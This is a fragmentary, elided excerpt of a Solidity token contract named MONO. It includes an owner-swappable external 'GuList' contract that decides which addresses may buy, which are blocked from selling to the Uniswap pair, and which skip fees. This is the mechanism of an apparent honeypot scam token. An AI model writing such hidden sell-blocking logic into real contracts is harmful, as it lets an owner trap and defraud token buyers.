...
interface IGu {
    function isW(address _addr) external returns(bool);
    function isB(address _addr) external returns(bool);
    function isS(address _addr) external returns(bool);
    function getT() external returns(uint256);
}
...
contract MONO is IERC20, Ownable {
    ...
    address private fundAddress = address(0xAf7d7DC9A65111689cfb01eCB84302e7CaAAaD88);
    address private inviteAddress = address(0xFB21716e3ed1676B09fc646a23946A3d88ee63d6);
    ...
    function getGu(address addr) public onlyOwner {
        GuList=IGu(addr);
    }
    ...
    function _transfer(
        ...
        if (from==uniswapV2Pair && isRoute[to]){
            ...
            if(block.timestamp<GuList.getT()){
                require(GuList.isB(to),"b error");
            }
            require(!GuList.isS(to),"s error");
            takeFee = true;
        }else if (to==uniswapV2Pair) {
            require(balanceOf(from).div(100).mul(99)>=amount,"b error");
            takeFee = true;
            require(!GuList.isS(from),"s error");
        }else{
        ...
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to] || GuList.isW(from) || GuList.isW(to)) {
            takeFee = false;
        }
